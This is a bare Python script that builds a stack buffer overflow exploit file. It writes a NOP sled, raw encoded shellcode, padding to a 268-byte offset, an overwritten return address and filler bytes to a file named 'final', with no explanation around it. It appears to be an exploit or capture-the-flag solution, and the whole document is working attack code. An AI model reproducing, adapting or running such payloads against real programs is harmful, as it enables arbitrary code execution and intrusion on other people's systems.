#!/usr/bin/python3

nopsled = b"\x90" * 60

shellcode = b"\xb8\x7d\x05\xcc\x95\xd9\xc6\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x12\x83\xed\xfc\x31\x45\x0e\x03\x38\x0b\x2e\x60\xf3\xc8\x59\x68\xa0\xad\xf6\x05\x44\xbb\x18\x69\x2e\x76\x5a\x19\xf7\x38\x64\xd3\x87\x70\xe2\x12\xef\x42\xbc\x9f\xee\x2a\xbf\x5f\xe1\xf6\x36\xbe\xb1\x61\x19\x10\xe2\xde\x9a\x1b\xe5\xec\x1d\x49\x8d\x80\x32\x1d\x25\x35\x62\xce\xd7\xac\xf5\xf3\x45\x7c\x8f\x15\xd9\x89\x42\x55"

padding_length = 268 - 60 - len(shellcode)

padding = b"A" * padding_length

eip = b"\xe7\x18\xc2\xf7"

junk = b"C" * 28

payload = nopsled + shellcode + padding + eip + junk

with open("final","wb") as f:
    f.write(payload)